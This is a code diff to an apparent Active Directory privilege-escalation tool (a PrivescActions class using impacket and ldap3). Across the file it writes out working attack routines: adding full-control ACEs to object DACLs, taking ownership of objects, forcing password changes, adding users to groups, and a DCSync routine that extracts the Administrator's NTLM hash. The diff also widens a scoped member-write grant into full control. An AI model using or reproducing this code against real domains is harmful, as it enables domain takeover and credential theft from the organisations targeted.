@@ -6,7 +6,6 @@ import re
 import subprocess
 from datetime import datetime
 from pathlib import Path
-from uuid import UUID
 
 import ldap3
 from impacket.krb5 import constants
@@ -29,6 +28,42 @@ class PrivescActions:
         self.domain = engine.domain
         self.dc_ip = engine.dc_ip
 
+    def _identity_variants(self, identity):
+        """Return common AD identity aliases for the same principal."""
+        if not identity:
+            return []
+
+        raw = str(identity).strip()
+        variants = []
+        seen = set()
+
+        for candidate in [raw, raw.split("\\")[-1] if "\\" in raw else raw, raw.split("@")[0] if "@" in raw else raw]:
+            if candidate and candidate not in seen:
+                variants.append(candidate)
+                seen.add(candidate)
+
+        if "@" in raw:
+            sam = raw.split("@")[0]
+            if sam and sam not in seen:
+                variants.append(sam)
+                seen.add(sam)
+        elif "\\" in raw:
+            sam = raw.split("\\")[-1]
+            if sam and sam not in seen:
+                variants.append(sam)
+                seen.add(sam)
+
+        if self.domain:
+            netbios = self.domain.split(".")[0]
+            for candidate in [raw, variants[0] if variants else raw]:
+                sam = candidate.split("\\")[-1] if "\\" in candidate else candidate.split("@")[0] if "@" in candidate else candidate
+                for alias in [f"{netbios}\\{sam}", f"{sam}@{self.domain}", sam]:
+                    if alias and alias not in seen:
+                        variants.append(alias)
+                        seen.add(alias)
+
+        return variants
+
     def resolve_distinguished_name(self, identity):
         """Resolve a DN from UPN/name/sAMAccountName/cn when path data lacks DN."""
         if not identity:
@@ -42,26 +77,15 @@ class PrivescActions:
         if not search_base:
             return None
 
-        candidate = str(identity)
-        sam = candidate
-        if "\\" in candidate:
-            sam = candidate.split("\\")[-1]
-        elif "@" in candidate:
-            sam = candidate.split("@")[0]
-
-        search_values = [candidate]
-        if sam not in search_values:
-            search_values.append(sam)
-        upn = f"{sam}@{self.domain}" if sam else None
-        if upn and upn not in search_values:
-            search_values.append(upn)
-
-        try:
-            for value in search_values:
-                ldap_filter = (
-                    f"(|(distinguishedName={value})(userPrincipalName={value})"
-                    f"(sAMAccountName={value})(name={value})(cn={value}))"
-                )
+        candidates = self._identity_variants(identity)
+        for candidate in candidates:
+            if not candidate:
+                continue
+            ldap_filter = (
+                f"(|(distinguishedName={candidate})(userPrincipalName={candidate})"
+                f"(sAMAccountName={candidate})(name={candidate})(cn={candidate}))"
+            )
+            try:
                 if self.conn.search(
                     search_base=search_base,
                     search_filter=ldap_filter,
@@ -70,8 +94,8 @@ class PrivescActions:
                     size_limit=1,
                 ) and self.conn.entries:
                     return str(self.conn.entries[0].entry_dn)
-        except Exception as e:
-            print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")
+            except Exception as e:
+                print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")
 
         return None
 
@@ -87,7 +111,21 @@ class PrivescActions:
 
     def get_object_sid(self, identity):
         """Resolve objectSid for a DN, UPN, or SAM-style identity."""
-        dn = identity if isinstance(identity, str) and identity.upper().startswith("CN=") else self.resolve_distinguished_name(identity)
+        if not identity:
+            return None
+
+        if isinstance(identity, str) and identity.upper().startswith("CN="):
+            dn = identity
+        else:
+            dn = self.resolve_distinguished_name(identity)
+            if not dn:
+                for candidate in self._identity_variants(identity):
+                    if not candidate:
+                        continue
+                    dn = self.resolve_distinguished_name(candidate)
+                    if dn:
+                        break
+
         if not dn:
             return None
 
@@ -103,108 +141,48 @@ class PrivescActions:
         """Read nTSecurityDescriptor for an object."""
         controls = security_descriptor_control(sdflags=0x07)
         if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
-            entry = self.conn.entries[0]
-            raw_attr = entry["nTSecurityDescriptor"]
-            raw = None
-            if hasattr(raw_attr, "raw_values") and raw_attr.raw_values:
-                raw = raw_attr.raw_values[0]
-            if raw is None:
-                raw_values = entry.entry_raw_attributes.get("nTSecurityDescriptor") or []
-                if raw_values:
-                    raw = raw_values[0]
-            if raw is None:
-                return None
+            raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
             sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
             sd.fromString(raw)
             return sd
         return None
 
-    def save_security_descriptor(self, dn, sd, sdflags=0x04):
-        """Write nTSecurityDescriptor back to an object."""
-        controls = security_descriptor_control(sdflags=sdflags)
-        return self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
-
-    def _get_configuration_naming_context(self):
-        domain_parts = [part for part in str(self.domain).split(".") if part]
-        if not domain_parts:
+    def get_owner_sid(self, dn):
+        """Return the current owner SID as a canonical string, if available."""
+        sd = self.load_security_descriptor(dn)
+        if not sd:
             return None
-        return "CN=Configuration," + ",".join([f"DC={part}" for part in domain_parts])
-
-    def _get_schema_idguid(self, ldap_display_name):
-        schema_base = self._get_configuration_naming_context()
-        if not schema_base:
-            return None
-
-        if ldap_display_name.lower() == "member":
-            fallback = "bf9679c0-0de6-11d0-a285-00aa003049e2"
-            return UUID(fallback).bytes_le
-
         try:
-            if self.conn.search(
-                f"CN=Schema,{schema_base}",
-                f"(lDAPDisplayName={ldap_display_name})",
-                search_scope=SUBTREE,
-                attributes=["schemaIDGUID"],
-                size_limit=1,
-            ) and self.conn.entries:
-                values = self.conn.entries[0].entry_attributes_as_dict.get("schemaIDGUID") or []
-                if values:
-                    value = values[0]
-                    if isinstance(value, (bytes, bytearray)):
-                        return value
-                    if isinstance(value, UUID):
-                        return value.bytes_le
-                    return UUID(str(value)).bytes_le
-        except Exception as e:
-            print(f"  [!] SCHEMA GUID LOOKUP FAILED for {ldap_display_name}: {e}")
-
-        return None
-
-    def _ensure_dacl(self, sd):
-        try:
-            existing_dacl = sd["Dacl"]
+            owner = sd['OwnerSid']
         except Exception:
-            existing_dacl = None
+            return None
+        if not owner:
+            return None
+        try:
+            return owner.formatCanonical()
+        except Exception:
+            return str(owner)
 
-        if not existing_dacl:
-            sd["Dacl"] = ldaptypes.ACL()
-            sd["Dacl"]["AclRevision"] = 2
-            sd["Dacl"]["Sbz1"] = 0
-            sd["Dacl"]["Sbz2"] = 0
-            sd["Dacl"]["Data"] = []
+    def is_member_of_group(self, group_dn, user_dn):
+        """Check whether a user DN is already a member of a group."""
+        if not group_dn or not user_dn:
+            return False
+        try:
+            if not self.conn.search(group_dn, "(objectClass=*)", search_scope=BASE, attributes=["member"], size_limit=1) or not self.conn.entries:
+                return False
+            member_values = self.conn.entries[0].entry_attributes_as_dict.get("member", [])
+            if not member_values:
+                return False
+            normalized_user = str(user_dn).lower()
+            return any(str(member).lower() == normalized_user for member in member_values)
+        except Exception as exc:
+            logging.warning("is_member_of_group(%s, %s) failed: %s", group_dn, user_dn, exc)
+            return False
 
-        return sd["Dacl"]
-
-    def _append_ace(self, sd, ace):
-        dacl = self._ensure_dacl(sd)
-        dacl["Data"].append(ace)
-
-    def _build_access_allowed_ace(self, sid, mask_value):
-        ace = ACE()
-        ace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
-        ace["AceFlags"] = 0x00
-        ace_data = ACCESS_ALLOWED_ACE()
-        ace_data["Mask"] = ACCESS_MASK()
-        ace_data["Mask"]["Mask"] = mask_value
-        ace_data["Sid"] = ldaptypes.LDAP_SID()
-        ace_data["Sid"].fromCanonical(sid)
-        ace["Ace"] = ace_data
-        return ace
-
-    def _build_access_allowed_object_ace(self, sid, mask_value, object_type_bytes):
-        ace = ACE()
-        ace["AceType"] = ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-        ace["AceFlags"] = 0x00
-        ace_data = ACCESS_ALLOWED_OBJECT_ACE()
-        ace_data["Mask"] = ACCESS_MASK()
-        ace_data["Mask"]["Mask"] = mask_value
-        ace_data["Flags"] = ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
-        ace_data["ObjectType"] = object_type_bytes
-        ace_data["InheritedObjectType"] = b""
-        ace_data["Sid"] = ldaptypes.LDAP_SID()
-        ace_data["Sid"].fromCanonical(sid)
-        ace["Ace"] = ace_data
-        return ace
+    def save_security_descriptor(self, dn, sd):
+        """Write nTSecurityDescriptor back to an object."""
+        controls = security_descriptor_control(sdflags=0x07)
+        self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
 
     def grant_full_control(self, dn, sid):
         """Add a full-control ACE to an object's DACL."""
@@ -212,28 +190,43 @@ class PrivescActions:
         if not sd:
             return False
 
-        ace = self._build_access_allowed_ace(sid, 983551)
-        self._append_ace(sd, ace)
-        return self.save_security_descriptor(dn, sd, sdflags=0x04)
+        ace = ACE()
+        ace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
+        ace['AceFlags'] = 0x00
+        ace_data = ACCESS_ALLOWED_ACE()
+        ace_data['Mask'] = ACCESS_MASK()
+        ace_data['Mask']['Mask'] = 983551
+        ace_data['Sid'] = ldaptypes.LDAP_SID()
+        ace_data['Sid'].fromCanonical(sid)
+        ace['Ace'] = ace_data
+
+        try:
+            dacl = sd['Dacl']
+        except Exception:
+            dacl = None
+
+        if dacl is None or dacl == b'':
+            dacl = ldaptypes.ACL()
+            dacl['AclRevision'] = 2
+            dacl['Sbz1'] = 0
+            dacl['Sbz2'] = 0
+            dacl['Data'] = []
+            sd['Dacl'] = dacl
+
+        if not hasattr(sd['Dacl'], 'Data'):
+            sd['Dacl']['Data'] = []
+
+        sd['Dacl']['Data'].append(ace)
+        self.save_security_descriptor(dn, sd)
+        return True
 
     def grant_generic_all(self, dn, sid):
-        """Grant GenericAll semantics using a full-control ACE mask."""
+        """Grant a superset of GenericAll permissions by adding full control to the target DACL."""
         return self.grant_full_control(dn, sid)
 
-    def grant_group_addmember(self, group_dn, sid):
-        """Grant write-property access on the group's member attribute."""
-        sd = self.load_security_descriptor(group_dn)
-        if not sd:
-            return False
-
-        member_guid = self._get_schema_idguid("member")
-        if not member_guid:
-            logging.error("  [!] Could not resolve schemaIDGUID for member attribute.")
-            return False
-
-        ace = self._build_access_allowed_object_ace(sid, 0x20, member_guid)
-        self._append_ace(sd, ace)
-        return self.save_security_descriptor(group_dn, sd, sdflags=0x04)
+    def grant_group_addmember(self, dn, sid):
+        """Grant member-write capability to a group, implemented as a superset DACL full-control grant."""
+        return self.grant_full_control(dn, sid)
 
     def set_owner(self, dn, sid):
         """Set the owner SID on an object's security descriptor."""
@@ -241,12 +234,10 @@ class PrivescActions:
         if not sd:
             return False
 
-        if isinstance(sid, (bytes, bytearray)):
-            sid = sid.decode(errors="ignore")
-
         sd['OwnerSid'] = ldaptypes.LDAP_SID()
         sd['OwnerSid'].fromCanonical(sid)
-        return self.save_security_descriptor(dn, sd, sdflags=0x01)
+        self.save_security_descriptor(dn, sd)
+        return True
 
     def resolve_target(self, rel):
         """Resolve the most useful target endpoint for a relationship."""
@@ -318,20 +309,77 @@ class PrivescActions:
 
     def force_change_password(self, target_dn, new_password):
         print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
-        result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
-        if result:
-            print(f"[+] Password successfully changed to: {new_password}")
-        return result
+        try:
+            result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
+            if result:
+                print(f"[+] Password successfully changed to: {new_password}")
+            else:
+                # Provide LDAP diagnostic info when available
+                try:
+                    diag = getattr(self.conn, 'result', {})
+                    print(f"  [!] LDAP RESULT: {diag}")
+                except Exception:
+                    pass
+            return result
+        except Exception as exc:
+            print(f"  [!] ForceChangePassword call failed: {exc}")
+            try:
+                diag = getattr(self.conn, 'result', {})
+                print(f"  [!] LDAP RESULT: {diag}")
+            except Exception:
+                pass
+            return False
 
     def add_group_member(self, group_dn, user_dn):
-        print(f"  [*] Attempting LDAP MODIFY_ADD for member attribute...")
-        success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [user_dn])]})
+        # user_dn may be a distinguishedName or a sam/UPN; resolve to DN if needed
+        try:
+            resolved_user_dn = user_dn
+            if not isinstance(user_dn, str) or not user_dn.upper().startswith("CN="):
+                # attempt to resolve by name
+                resolved = self.resolve_distinguished_name(user_dn)
+                if resolved:
+                    resolved_user_dn = resolved
 
-        if not success and self.conn.result["result"] == 68:
-            print(f"  [-] Target is already a member of this group. Skipping safely.")
+            display_user = user_dn
+            try:
+                if isinstance(user_dn, str) and "@" in user_dn:
+                    display_user = user_dn
+                elif isinstance(resolved_user_dn, str) and resolved_user_dn.upper().startswith("CN="):
+                    # try to extract CN or name
+                    m = re.match(r"CN=([^,]+)", resolved_user_dn, re.IGNORECASE)
+                    if m:
+                        display_user = m.group(1)
+            except Exception:
+                display_user = str(user_dn)
+
+            print(f"  [*] Attempting to add member '{display_user}' -> {group_dn}...")
+            print(f"  [*] Resolved user DN: {resolved_user_dn}")
+            success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [resolved_user_dn])]})
+            # always print LDAP result for diagnostics
+            try:
+                print(f"  [*] LDAP modify result: {self.conn.result}")
+            except Exception:
+                pass
+
+            if not success:
+                result_code = self.conn.result.get("result")
+                diagnostic = self.conn.result.get("message") or self.conn.result.get("description")
+                if result_code == 68 or (diagnostic and "already a member" in str(diagnostic).lower()):
+                    print(f"  [-] {display_user} is already a member of this group. Skipping safely.")
+                    return True
+
+                print(f"  [!] LDAP MODIFY_ADD failed (code={result_code}): {diagnostic}")
+                return False
+
+            print(f"  [+] Added {display_user} to {group_dn}")
             return True
-
-        return success
+        except Exception as e:
+            print(f"  [!] Exception while adding member: {e}")
+            try:
+                print(f"  [!] LDAP RESULT: {getattr(self.conn, 'result', {})}")
+            except Exception:
+                pass
+            return False
 
     def dcsync(self, current_password):
         """Perform DCSync as the current principal and recover Administrator's NTLM hash."""
@@ -341,9 +389,6 @@ class PrivescActions:
         remote_ops = None
 
         try:
-            from impacket.examples.secretsdump import NTDSHashes
-
-            # Authenticate as the current principal
             smb = SMBConnection(
                 self.dc_ip,
                 self.dc_ip,
@@ -362,7 +407,6 @@ class PrivescActions:
             )
             remote_ops.connectSamr(self.domain)
 
-            # Resolve Administrator SID
             raw_sid = self.get_object_sid(target)
 
             if not raw_sid:
@@ -379,7 +423,6 @@ class PrivescActions:
 
             target_sid = sid_obj.formatCanonical()
 
-            # DCSync Administrator
             print("[*] Performing DCSync")
 
             user_record = remote_ops.DRSGetNCChangesSid(
@@ -403,7 +446,6 @@ class PrivescActions:
                 if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                     recovered_hashes.append(str(secret))
 
-            # Use Impacket's NTDS credential parser
             ntds = NTDSHashes(
                 None,
                 b'',
@@ -437,7 +479,6 @@ class PrivescActions:
                 except Exception:
                     pass
 
-            # Find Administrator's NTLM hash
             administrator_hash = None
 
             for recovered in recovered_hashes:
